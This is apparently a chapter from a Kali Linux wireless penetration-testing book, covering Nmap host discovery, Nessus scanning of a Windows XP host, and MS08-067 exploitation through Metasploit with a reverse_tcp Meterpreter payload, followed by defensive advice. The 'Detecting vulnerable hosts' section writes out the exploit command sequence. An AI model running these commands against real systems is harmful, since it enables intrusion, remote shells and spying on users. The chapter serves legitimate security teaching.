- en: Chapter 5. Gaining Access to the Network
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Here we are in the fifth chapter! In this chapter, we will be discussing several
    topics relevant to you having access to a network as a wireless penetration tester.
    We will be running assessments on the network to identify hosts, determine network
    size, and detect vulnerability hosts. It is a good idea to know how many hosts
    are on the network when conducting a pentest because you simply do not want to
    leave anything out of your penetration test. Let's begin the chapter by discussing
    why this is important.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this chapter, we will discuss the following topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Identifying hosts
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Determining network size
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Detecting vulnerable hosts
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Preventing against threats
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: If there happens to be a client running Windows 2000 or XP on the network, we
    need to know. The user is fully aware that they are at risk because they are using
    an older version of the Windows operating system. Windows XP can be compromised
    in a matter of minutes! As of April 2014, Microsoft dropped support for Windows
    XP. Windows XP is no longer supported, which means this version of the operating
    system will attract many attackers searching for vulnerabilities. The reason behind
    this is simply because Microsoft will not release any more security patches, so
    if an attacker finds a vulnerability in the system, it will always stay vulnerable.
  prefs: []
  type: TYPE_NORMAL
- en: We will be using several networking tools to determine how many hosts are on
    the network, the host's operating system version, the network size, and vulnerable
    hosts. Knowing what is vulnerable on the network and then providing security patches
    or updates will help strengthen the security. Keep in mind, not only do you need
    to know what systems and devices are vulnerable, but also the users in your organization!
  prefs: []
  type: TYPE_NORMAL
- en: This is probably one of the biggest security threats that I see. Your staff
    need to undergo a security awareness program to understand what is good and bad
    as well as the do's and don'ts. You could also have staff who are sharing customer
    information outside of work for potential gain. Keep an eye out for any suspicious
    activity that you believe will harm the business.
  prefs: []
  type: TYPE_NORMAL
- en: Identifying hosts
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: This section is all about the different tools that you can use to identify hosts
    on a network. These tools will provide detailed information on a user's IP address,
    MAC address, open and closed ports, services, operating system, and so on. In
    the following sections you can see a list of tools that Kali Linux has that can
    help identify hosts on a network.
  prefs: []
  type: TYPE_NORMAL
- en: Network mapping tools
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'We will be focusing on Nmap through the command-line interface. Here are some
    alternative tools that can be used to map out networks:'
  prefs: []
  type: TYPE_NORMAL
- en: 0trace
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Angry IP Scanner
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: hping2 and hping3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: lanmap and lanmap2
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: TCP traceroute
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: In this demonstration, you will learn how to identify hosts on the network by
    using Nmap. These tools are by far my favorite when it comes to network discovery
    or when you need to know whether a network service is running such as Telnet,
    SSH, or FTP. Let's begin!
  prefs: []
  type: TYPE_NORMAL
- en: Open the Terminal.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Type the following command and press *Enter*:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: As you can see in the following screenshot, my private IP address is `192.168.1.5`.
    My gateway happens to be `192.168.1.1` so I will be showing you how to scan the
    entire subnet next.
  prefs: []
  type: TYPE_NORMAL
- en: '![Network mapping tools](img/3183OS_05_01.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Type the following command and press *Enter*:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: This command will start a ping sweep on all hosts on `192.168.1.1` through `192.168.1.254`.
    When you receive your output, you'll notice some interesting information such
    as open and closed ports, services, and what OS they are running.
  prefs: []
  type: TYPE_NORMAL
- en: This is also a great technique to use if a host has been infected with Conflicker.
    You'll need to learn some of Nmap's command-line switches to do this.
  prefs: []
  type: TYPE_NORMAL
- en: 'As you can see in the following screenshot, I was able to detect several systems
    and devices on my local network:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Network mapping tools](img/3183OS_05_02.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'You can see my Cisco wireless router and the ports that are open and filtered:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Network mapping tools](img/3183OS_05_03.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'If you happen to have a firewall on the network, you need to run the following
    command:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: 'This command will treat all hosts as online and skip host discovery. It is
    used to bypass common filters from firewalls to determine whether the firewall
    is online and is illustrated in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Network mapping tools](img/3183OS_05_04.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Determining the network size
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Determining the network size isn't difficult. It is much easier if you happen
    to have some experience with networking in general. I will provide several steps
    on how to determine the network size and an estimated number of hosts. Let's begin!
  prefs: []
  type: TYPE_NORMAL
- en: Determining the network size in Kali Linux
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'In this demonstration, we will be determining the network size in Kali Linux.
    Perform the following steps:'
  prefs: []
  type: TYPE_NORMAL
- en: Open the Terminal.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Type the following command and press *Enter*:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: 'The following is the output:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Determining the network size in Kali Linux](img/3183OS_05_05.jpg)'
  prefs: []
  type: TYPE_IMG
- en: You will want to scroll up and down to navigate to your network configuration.
    The subnet mask is shown in the preceding screenshot as `255.255.255.0`. If we
    calculate this by doing some subnetting mathematics, we can determine that this
    network could have hosts between 1 and 254.
  prefs: []
  type: TYPE_NORMAL
- en: You may ask yourself, what does determining the network size have to do with
    penetration testing? Determining the network size helps the penetration tester
    get an estimated amount of hosts on a network. This can help make a penetration
    test easier when knowing the number of networks such as a data center or college
    campus.
  prefs: []
  type: TYPE_NORMAL
- en: Detecting vulnerable hosts
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: This section is pretty straightforward. If you happen to know someone who doesn't
    update their system on a daily basis, they are most likely vulnerable to the latest
    security threats. As of right now, Windows XP is very unsecure, especially if
    a user doesn't have any updates or service packs installed on their system. In
    the next demonstration, I will be showing you vulnerability within Windows XP.
    Since I do not have a valid copy of Windows 7 or 8 on hand, I cannot demonstrate
    these operating systems.
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s perform the following steps:'
  prefs: []
  type: TYPE_NORMAL
- en: Scan the target to see the services running:![Detecting vulnerable hosts](img/3183OS_05_06.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: This command enables OS detection, version detection, script scanning, and traceroute.
  prefs: []
  type: TYPE_NORMAL
- en: Scan for vulnerabilities using Nessus.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: If you are running Nessus for the first time, please note that you will need
    to register Nessus first.
  prefs: []
  type: TYPE_NORMAL
- en: In the following screenshot, you'll see that we provided the IP address of the
    host we are going to scan for vulnerabilities. The host is running Windows XP
    Professional Service Pack 3.![Detecting vulnerable hosts](img/3183OS_05_07.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: As shown in the following screenshot, we are now ready to click on **Launch**
    to start our scan with Nessus:![Detecting vulnerable hosts](img/3183OS_05_08.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: After the scan has finished, we need to analyze the report:![Detecting vulnerable
    hosts](img/3183OS_05_09.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: As you can see in our results, there are several vulnerable services:![Detecting
    vulnerable hosts](img/3183OS_05_10.jpg)
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: If you select one of them and look at the plugin's name, it says `MS08-067`.
    We will be using this later to find our exploit.
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s begin to search for our exploit. Start a new Metasploit console using
    the following command:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: 'The following screen appears:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Detecting vulnerable hosts](img/3183OS_05_11.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Note
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Metasploit Framework can be downloaded from [http://www.rapid7.com/products/metasploit/download.jsp](http://www.rapid7.com/products/metasploit/download.jsp).
    Metasploit Framework is an open source attack framework developed by H. D. Moore
    in 2003\. It is used to hack into systems and devices for testing purposes. It
    provides information for those who do penetration testing, IDS signature development,
    and research on exploits.
  prefs: []
  type: TYPE_NORMAL
- en: 'To search for our exploit, type the following:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: 'The following is the output:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Detecting vulnerable hosts](img/3183OS_05_12.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'Type all of these commands:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '`use exploit/windows/smb/ms08_067_netapi`: This command sets Metasploit Framework
    to use the exploit `ms08_067_netapi`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`set RHOST 192.168.1.30`: This command sets the remote host to the user whom
    you are exploiting'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`set PAYLOAD windows/meterpreter/reverse_tcp`: This command sets the payload
    to `reverse_tcp` so that we can connect back to the host after the exploit was
    successful'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`set LHOST 192.16``8.1.5`: This command sets the local host which is the Kali
    Linux host''s IP address'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`exploit`: This command launches the exploit in real time so you can see the
    details in action'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'If you would like to run a different payload, use the command:'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: 'In the following screenshot, we can see the output of the commands we entered
    previously:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Detecting vulnerable hosts](img/3183OS_05_13.jpg)'
  prefs: []
  type: TYPE_IMG
- en: 'If done correctly, we should have a Meterpreter shell:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Detecting vulnerable hosts](img/3183OS_05_14.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Meterpreter shell is a completely separate environment between you and the exploited
    host. It is not required to run but it is more of a proof of concept than anything
    else. You can execute programs, batch scripts; navigate through the system hierarchy,
    hashdump, network configuration; and even take a snapshot from the webcam. So
    what would happen if someone was able to get a Meterpreter session on you? They
    could create a backdoor to the system and gain administrative rights.
  prefs: []
  type: TYPE_NORMAL
- en: Congratulations! We have successfully detected and exploited a vulnerable host
    over a wireless network. From here, we could look up running processes on the
    target system, take screenshots, record keystrokes, or even view attached webcams.
    Meterpreter is a very powerful shell. Be sure to take some time to get a good
    look at it.
  prefs: []
  type: TYPE_NORMAL
- en: '![Detecting vulnerable hosts](img/3183OS_05_15.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Preventing against threats
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: We always need to know how to protect ourselves from these threats and attacks.
    Next, I will be discussing how to protect yourself from these attacks.
  prefs: []
  type: TYPE_NORMAL
- en: Preventing the identification of hosts
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: To protect yourself from threats and risks, small and large businesses should
    have a hardware firewall such as the WatchGuard XTM or Cisco ASA with custom rules
    to block services and ports that are not in use. The services that aren't in use
    should also be disabled from the server or network device to prevent any unauthorized
    access. Intrusion detection systems with alerting enabled for SMS or e-mail. Firewall
    should be logging protocols and flagging alerts.
  prefs: []
  type: TYPE_NORMAL
- en: If the firewall or IDS is not monitored, then how would you know if your organization
    was compromised? Daily monitoring is very important to stay ahead of your threats
    and risks that are available on the outside network. Separate your networks from
    each other using VLANs. The servers, workstations, VoIP, and wireless should have
    their own VLAN to keep the network isolated from network infections and compromise.
  prefs: []
  type: TYPE_NORMAL
- en: Preventing others from determining your network size
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: When determining network size, you should always encrypt any sensitive information
    such as network diagrams, passwords, logs, workstation and server information,
    and configuration settings. A hardware firewall such as WatchGuard XTM or Cisco
    ASA are a great for both small and large businesses to control traffic by blocking
    ICMP and only allowing traffic from trusted sources.
  prefs: []
  type: TYPE_NORMAL
- en: Protection of vulnerable hosts
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: To protect your systems and network devices from exploitation, install the latest
    security patches provided by your vendors. Install the latest operating system
    and software updates when they are available. If you run into conflicts when upgrading,
    report the issue to your software vendor. Use the strongest wireless encryption
    WPA2 with AES encryption algorithm with a complex passphrase. Run a real-time
    antivirus scanner with the latest virus definitions on all of your workstations
    and servers. Provide security awareness training to staff members.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Wow! We completed three demonstrations in this chapter! I hope you enjoyed the
    demonstrations as much as I did. This chapter was a lot of fun and interesting
    for the both of us. Let's take a few moments to look back at what you learned.
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, we discussed why it is important to find the number of live
    hosts when conducting a penetration test on a network. Next, we demonstrated identifying
    hosts on the network with Kali Linux. Then, we demonstrated determining network
    size and explained why it is important to understand as a penetration tester.
    We finished the chapter by demonstrating detecting vulnerabilities in Windows
    XP using the Nessus vulnerability scanner and listed several preventions that
    could help reduce risk.
  prefs: []
  type: TYPE_NORMAL
- en: In the next chapter, we will cover how to plan a vulnerability assessment, configure
    the Nessus vulnerability scanner, run the Nessus vulnerability scanner, and patch
    vulnerabilities. I'm quite sure you are just as excited as I am. Let's move on
    to to the next chapter!
  prefs: []
  type: TYPE_NORMAL
